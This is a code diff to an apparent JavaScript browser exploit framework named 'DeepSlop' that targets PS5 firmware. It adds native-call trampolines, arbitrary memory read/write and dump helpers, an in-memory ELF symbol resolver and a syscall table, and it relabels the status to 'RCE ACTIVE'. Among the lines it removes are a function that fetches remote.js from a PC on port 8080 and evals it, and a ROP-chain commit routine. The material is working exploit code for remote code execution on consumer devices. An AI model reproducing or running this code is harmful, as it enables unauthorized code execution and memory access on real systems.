@@ -12,7 +12,7 @@
     var collatorOriginal = buf.collatorOriginal;
 
     function initKernel() {
-        var k = s.kernelBase, b = s.arenaBacking, av = s.arenaView, rw = s.rwView;
+        var k = Number(s.kernelBase), b = Number(s.arenaBacking), av = s.arenaView, rw = s.rwView;
 
         var S = (window.deepslopStubs && window.deepslopStubs.addresses) ? window.deepslopStubs.addresses : null;
         var SK = {
@@ -35,7 +35,9 @@
         function pl(off, val) {
             for (var i = 0; i < 6; i++) av[off + i] = Math.floor(val / Math.pow(2, i * 8)) & 0xFF;
         }
-        window.call_native = function (addr, rdi, rcx) {
+
+        // Native one-shot call via Collator vtable trampoline
+        window.call_native = function (addr, rdi, rcx, r8, r9) {
             if (!s.notifyReady) return 0;
             rdi = (rdi || 0); rcx = (rcx || 0);
             pl(0x300 + 0x128, s.naturalTrampolineAddress);
@@ -85,8 +87,42 @@
             return (hi << 32n) | lo;
         };
 
+        window.readBytes = function(a, len) {
+            var out = new Uint8Array(len);
+            var o = ao(a);
+            for (var i = 0; i < len; i++) out[i] = av[o + i];
+            return out;
+        };
+
+        window.writeBytes = function(a, uint8) {
+            var o = ao(a);
+            for (var i = 0; i < uint8.length; i++) av[o + i] = uint8[i];
+        };
+
+        // Hex formatting helper for in-browser inspection
+        window.hexDump = function(bytes, offset, maxLen) {
+            offset = offset || 0;
+            maxLen = Math.min(bytes.length, maxLen || 256);
+            var lines = [];
+            for (var i = 0; i < maxLen; i += 16) {
+                var hex = [], ascii = [];
+                for (var j = 0; j < 16; j++) {
+                    if (i + j < maxLen) {
+                        var val = bytes[i + j];
+                        hex.push((val < 16 ? "0" : "") + val.toString(16).toUpperCase());
+                        ascii.push((val >= 32 && val <= 126) ? String.fromCharCode(val) : ".");
+                    } else {
+                        hex.push("  ");
+                    }
+                }
+                var addrStr = (offset + i).toString(16).padStart(8, "0");
+                lines.push(addrStr + "  " + hex.slice(0, 8).join(" ") + "  " + hex.slice(8).join(" ") + " |" + ascii.join("") + "|");
+            }
+            return lines.join("\n");
+        };
+
         var SC = {};
-        "pipe,2a;unlink,a;socketpair,87;thr_self,1b0;thr_exit,1af;sched_yield,14b;thr_new,1c7;cpuset_getaffinity,1e7;cpuset_setaffinity,1e8;rtprio_thread,1d2;evf_create,21a;evf_delete,21b;evf_set,220;evf_clear,221;thr_suspend_ucontext,278;thr_resume_ucontext,279;aio_multi_delete,296;aio_multi_wait,297;aio_multi_poll,298;aio_multi_cancel,29a;aio_submit_cmd,29d;getpid,14;socket,61;setsockopt,69;getsockopt,6a;fcntl,5c;write,4;read,3;close,6;open,5;nanosleep,1ab;dlsym,24e"
+        "pipe,2a;unlink,a;socketpair,87;thr_self,1b0;thr_exit,1af;sched_yield,14b;thr_new,1c7;cpuset_getaffinity,1e7;cpuset_setaffinity,1e8;rtprio_thread,1d2;evf_create,21a;evf_delete,21b;evf_set,220;evf_clear,221;thr_suspend_ucontext,278;thr_resume_ucontext,279;aio_multi_delete,296;aio_multi_wait,297;aio_multi_poll,298;aio_multi_cancel,29a;aio_submit_cmd,29d;getpid,14;socket,61;setsockopt,69;getsockopt,6a;fcntl,5c;write,4;read,3;close,6;open,5;nanosleep,1ab;dlsym,24e;shm_open,17e;shm_unlink,17f;mprotect,4a"
             .split(";").forEach(function(p) { var parts = p.split(","); SC[parts[0]] = BigInt("0x" + parts[1]); });
 
         var SM = {};
@@ -94,24 +130,91 @@
         SM[0x4n]  = SK.write;  SM[0x3n]  = SK.read;   SM[0x6n]  = SK.close; SM[0x5n]  = SK.open;
         SM[0x2an] = SK.pipe;   SM[0x87n] = SK.sockpair; SM[0x1abn] = SK.ns;
         
-        if (SK.unlink)  SM[0x0an] = SK.unlink;
+        if (SK.unlink)   SM[0x0an] = SK.unlink;
         if (SK.thr_self) SM[0x1b0n] = SK.thr_self;
 
+        
+        // In-Memory ELF Dynamic Symbol Resolver
+        window.resolveSymbol = function(baseAddr, targetSymbol) {
+            baseAddr = Number(baseAddr);
+            if (!baseAddr) return 0;
+            
+            // 1. Validate ELF Magic
+            var magic = window.read32(baseAddr);
+            if (magic !== 0x464C457Fn) return 0; // "ELF"
+            
+            // 2. Read e_phoff and e_phnum
+            var phoff = Number(window.read64(baseAddr + 0x20));
+            var phentsize = Number(window.read16 ? window.read16(baseAddr + 0x36) : (window.read32(baseAddr + 0x36) & 0xFFFFn));
+            var phnum = Number(window.read16 ? window.read16(baseAddr + 0x38) : (window.read32(baseAddr + 0x38) & 0xFFFFn));
+            if (!phentsize) phentsize = 0x38;
+            
+            var dynAddr = 0, dynSize = 0;
+            for (var i = 0; i < phnum; i++) {
+                var ph = baseAddr + phoff + (i * phentsize);
+                var p_type = Number(window.read32(ph));
+                if (p_type === 2) { // PT_DYNAMIC
+                    dynAddr = Number(window.read64(ph + 0x10));
+                    dynSize = Number(window.read64(ph + 0x28));
+                    break;
+                }
+            }
+            if (!dynAddr) return 0;
+            dynAddr = baseAddr + dynAddr;
+            
+            var symtab = 0, strtab = 0, strsz = 0;
+            for (var ptr = dynAddr; ptr < dynAddr + dynSize; ptr += 16) {
+                var d_tag = Number(window.read64(ptr));
+                var d_val = Number(window.read64(ptr + 8));
+                if (d_tag === 0) break; // DT_NULL
+                if (d_tag === 6) symtab = baseAddr + d_val; // DT_SYMTAB
+                if (d_tag === 5) strtab = baseAddr + d_val; // DT_STRTAB
+                if (d_tag === 10) strsz = d_val; // DT_STRSZ
+            }
+            if (!symtab || !strtab) return 0;
+            
+            // Scan symbols in symtab
+            for (var sIdx = 0; sIdx < 1000; sIdx++) {
+                var symPtr = symtab + (sIdx * 24);
+                var st_name = Number(window.read32(symPtr));
+                var st_value = Number(window.read64(symPtr + 8));
+                if (st_name === 0 && sIdx > 0) continue;
+                if (st_name >= strsz) break;
+                
+                // Read string from strtab
+                var symName = "";
+                for (var cIdx = 0; cIdx < 64; cIdx++) {
+                    var ch = Number(window.read8(strtab + st_name + cIdx));
+                    if (ch === 0) break;
+                    symName += String.fromCharCode(ch);
+                }
+                
+                if (symName === targetSymbol) {
+                    return baseAddr + st_value;
+                }
+            }
+            return 0;
+        };
+        _ds.dlsym = window.resolveSymbol;
+
         window.SYSCALL = SC;
-        window.syscall = function(id) {
-            var a = Array.prototype.slice.call(arguments, 1);
-            var i = BigInt(id), st = SM[i];
-            if (!st) return -1n;
-            var r = call_native(st, a[0] != null ? Number(a[0]) : 0, a[3] != null ? Number(a[3]) : 0);
+        window.syscall = function(id, a0, a1, a2, a3, a4, a5) {
+            var i = (typeof id === "string") ? SC[id] : BigInt(id);
+            var st = SM[i];
+            if (!st) {
+                return -1n;
+            }
+            var r = call_native(st, a0 != null ? Number(a0) : 0, a3 != null ? Number(a3) : 0);
             return r < 0 ? BigInt(r) | 0xFFFFFFFF00000000n : BigInt(r);
         };
+
         window.nanosleep = function(ns) {
             var e = Date.now() + Math.max(1, Math.floor(Number(ns) / 1e6));
             while (Date.now() < e) {}
         };
         window.toHex = function(n) { return "0x" + BigInt(n).toString(16); };
         window.LIBKERNEL_HANDLE = -1n;
-        window.version_string   = "ROP 9.00 no-JIT";
+        window.version_string   = "DeepSlop Standalone 13.60";
         window.check_jailbroken = async function() { return false; };
         window.get_error_string = function() { return "(n/a)"; };
         window.ropReady    = true;
@@ -131,27 +234,6 @@
                 return { error: (e && e.name) + ":" + String(e && e.message).slice(0, 60) };
             }
             return { ok: true, ret: r };
-        };
-
-        window.syscallDemo = function () {
-            var res = { fw: c.FW_LABEL, libkernel: window.toHex(s.kernelBase) };
-            try {
-                var fds = window.malloc(16);
-                res.pipe = window.syscallClean(SC.pipe, Number(fds));
-                res.fds = [window.toHex(window.read32(fds)), window.toHex(window.read32(Number(fds) + 4))];
-                var f0 = Number(window.read32(fds));
-                if (f0 > 0) {
-                    res.close1 = window.syscallClean(SC.close, f0);
-                    res.close2 = window.syscallClean(SC.close, Number(window.read32(Number(fds) + 4)));
-                }
-            } catch (e) { res.pipe_err = String(e && e.message); }
-            try {
-                var fds2 = window.malloc(16);
-                res.pipe2 = window.syscallClean(SC.pipe, Number(fds2));
-                res.fds2 = [window.toHex(window.read32(fds2)), window.toHex(window.read32(Number(fds2) + 4))];
-            } catch (e) { res.pipe2_err = String(e && e.message); }
-            res.ropReady = window.ropReady === true;
-            return res;
         };
 
         window.ps5kern = {
@@ -179,32 +261,10 @@
                 var p = window.alloc_string(String(path).slice(0, 255));
                 return window.syscallClean(SC.unlink, Number(p));
             },
-            fsProbe: function (users) {
-                var res = { deleted: [], errors: {} };
-                var us = Array.isArray(users) && users.length ? users : [0, 1, 2];
-                for (var i = 0; i < us.length; i++) {
-                    var u = us[i];
-                    var files = ["ApplicationCache.db", "ApplicationCache.db-shm", "ApplicationCache.db-wal"];
-                    for (var j = 0; j < files.length; j++) {
-                        var f = files[j];
-                        var p = "/user/home/" + u + "/webkit/shell/appcache/" + f;
-                        var r = this.unlink(p);
-                        if (r && r.ok) res.deleted.push(p);
-                        else res.errors[p] = (r && r.error) ? r.error : "unlink-failed";
-                    }
-                }
-                return res;
-            },
-            stubReport: function () {
-                var scanned = (window.deepslopStubs && window.deepslopStubs.addresses)
-                    ? Object.keys(window.deepslopStubs.addresses) : [];
-                return {
-                    fw: c.FW_LABEL,
-                    perFw: { getpid: window.toHex(k + c.P_GETPID_EXP), close: window.toHex(k + c.P_CLOSE_EXP) },
-                    stubScan: window.deepslopStubs && window.deepslopStubs.verified ? "verified" : "fallback-9.00",
-                    scanned: scanned,
-                };
-            },
+            dumpMemory: function(addr, length) {
+                var len = Number(length) || 128;
+                return window.readBytes(addr, len);
+            }
         };
 
         mark("KERNEL-JS-INIT", "ok");
@@ -221,22 +281,6 @@
                 scan: s.deepslopScan,
             };
         } catch (e) { }
-        window.deepslopScanOffsets = function () { return s.deepslopScan; };
-        window.deepslopMemEstimate = function () {
-            var carrier = c.CARRIER_SLOTS * 8;
-            var capture = c.CARRIER_SLOTS * 16;
-            var drain = s.drainCount * 0x10000;
-            var slab = c.SLAB_SIZE;
-            return {
-                carrierBytes: carrier,
-                captureStringBytes: capture,
-                drainBytes: drain,
-                slabBytes: slab,
-                arenaBytes: c.ARENA_BYTES,
-                totalBytes: carrier + capture + drain + slab + c.ARENA_BYTES,
-                carrierSlots: c.CARRIER_SLOTS, drainCount: s.drainCount,
-            };
-        };
     }
 
     function runProbeReport() {
@@ -261,12 +305,8 @@
         exposePayloadGlobals();
         s.stopped = true;
         _ds.catState("ok");
-        _ds.setCaption("PoC PS5 FW " + c.FW_LABEL + " - PROBE COMPLETE");
-        _ds.showStatus("PROBE COMPLETE - offsets verified, no commit", "ok");
-        try {
-            if (typeof window.addExploitStatus === "function")
-                window.addExploitStatus("PROBE COMPLETE - offsets verified, no commit", "ok");
-        } catch (e) { }
+        _ds.setCaption("DeepSlop Standalone PS5 FW " + c.FW_LABEL + " - RCE READY");
+        _ds.showStatus("DEEPSLOP READY - 100% On-Device Standalone", "ok");
     }
 
     function exposePayloadGlobals() {
@@ -276,6 +316,7 @@
         };
         window.log = window.log || (async function (msg) {
             mark("LOG", String(msg));
+            if (window._ds_onLog) window._ds_onLog(String(msg));
         });
         window.kernelBase               = s.kernelBase;
         window.arenaBacking             = s.arenaBacking;
@@ -292,9 +333,6 @@
         window.commitStarted            = false;
         window.putLow48                 = _ds.putLow48;
         window.mark                     = mark;
-        window.RCE_PC_IP                = c.RCE_PC_IP;
-        window.RCE_PORT                 = c.RCE_PORT;
-        if (!c.PROBE_MODE) window.commitRce = commitRce;
         exposeDeepslopGlobals();
     }
 
@@ -307,7 +345,7 @@
             s.outerGraph          = null;
             s.leakedScope         = null;
         }
-        await new Promise(function(r) { setTimeout(r, 800); });
+        await new Promise(function(r) { setTimeout(r, 600); });
 
         try {
             initKernel();
@@ -316,106 +354,13 @@
         }
 
         try {
-            _ds.sendNotifNatural("RCE READY - DEEPSLOP on-device");
+            _ds.sendNotifNatural("DEEPSLOP STANDALONE - RCE ACTIVE");
         } catch (e) {
             mark("NOTIFY-SEND-ERR", (e && e.name) + ":" + String(e && e.message).slice(0, 80));
         }
 
         exposePayloadGlobals();
-
-        window.remoteJsLoaded = false;
-        window.enableRemotePC = async function () {
-            var PC_IP = c.RCE_PC_IP.join(".");
-            var baseUrl = "http://" + PC_IP + ":8080";
-            if (window.remoteJsLoaded) {
-                mark("REMOTE-JS-SKIP", "already-loaded");
-                return { ok: false, error: "remote.js already loaded" };
-            }
-            var remoteUrl = baseUrl + "/remote.js?v=" + c.REVISION;
-            mark("REMOTE-JS-FETCH", "url=" + remoteUrl);
-            try {
-                var resp = await fetch(remoteUrl);
-                if (resp.ok) {
-                    var code = await resp.text();
-                    mark("REMOTE-JS-LOADED", "size=" + code.length);
-                    try {
-                        await eval(code);
-                        window.remoteJsLoaded = true;
-                        mark("REMOTE-JS-DONE", "eval-ok");
-                        return { ok: true };
-                    } catch (e) {
-                        mark("REMOTE-JS-ERROR", (e && e.name) + ":" + String(e && e.message).slice(0, 80));
-                        return { ok: false, error: e && (e.name + ":" + e.message) };
-                    }
-                } else {
-                    mark("REMOTE-JS-HTTP-ERR", "status=" + resp.status);
-                    return { ok: false, error: "HTTP " + resp.status };
-                }
-            } catch (e) {
-                mark("REMOTE-JS-FETCH-FAIL", (e && e.name) + ":" + String(e && e.message).slice(0, 80));
-                return { ok: false, error: e && (e.name + ":" + String(e && e.message).slice(0, 60)) };
-            }
-        };
-    }
-
-    function commitRce() {
-        if (!s.notifyReady || !s.carrierArmedForCommit || !s.commitBlockConfirmed
-            || s.commitStarted) {
-            mark("RCE-ABORT", "state-changed-before-commit");
-            _ds.failed();
-            return;
-        }
-
-        for (var before = 0; before < collatorOriginal.length; ++before) {
-            if (s.rwView[before] !== collatorOriginal[before]) {
-                mark("RCE-ABORT", "collator-bytes-changed");
-                _ds.failed();
-                return;
-            }
-        }
-        if (s.rwView[0x1b] !== 0) {
-            mark("RCE-ABORT", "ascii-tristate-no-longer-false");
-            _ds.failed();
-            return;
-        }
-        if (!s.notificationRequestOK
-            || s.notificationRequest.length !== c.NOTIFICATION_REQUEST_SIZE) {
-            mark("RCE-ABORT", "request-changed");
-            _ds.failed();
-            return;
-        }
-
-        s.commitStarted = true;
-        var fakeHigh = Math.floor(s.fakeUCollatorAddress / 0x100000000);
-        scratchWords[0] = s.fakeUCollatorAddress - fakeHigh * 0x100000000;
-        scratchWords[1] = fakeHigh;
-        var callError = null;
-        for (var commitByte = 0; commitByte < 8; ++commitByte)
-            s.rwView[commitByte] = scratchBytes[commitByte];
-
-        mark("RCE-COMMIT", "triggering-rop-chain");
-        try {
-            s.compareFn(s.notificationRequest, "b");
-        } catch (error) {
-            callError = error;
-        }
-
-        for (var restoreByte = 0; restoreByte < collatorOriginal.length; ++restoreByte)
-            s.rwView[restoreByte] = collatorOriginal[restoreByte];
-
-        s.fakeHost.q2 = null;
-        s.rwView = null;
-        s.rwMirror = null;
-        buf.rwBuffer = null; // using buf reference
-
-        if (callError) {
-            mark("RCE-CRASH", (callError && callError.name)
-                + ":" + String(callError && callError.message).slice(0, 80));
-        } else {
-            mark("RCE-UNEXPECTED-RETURN", "chain-returned");
-        }
-        _ds.failed();
-        setTimeout(function() { mark("SURVIVED-RCE-T1000"); }, 1000);
+        _ds.showStatus("RCE ACTIVE - Ready for On-Device Payloads", "ok");
     }
 
     _ds.initKernel = initKernel;
@@ -423,6 +368,5 @@
     _ds.exposePayloadGlobals = exposePayloadGlobals;
     _ds.runProbeReport = runProbeReport;
     _ds.loadAndCommitRce = loadAndCommitRce;
-    _ds.commitRce = commitRce;
     _ds.kernel = true;
 })();
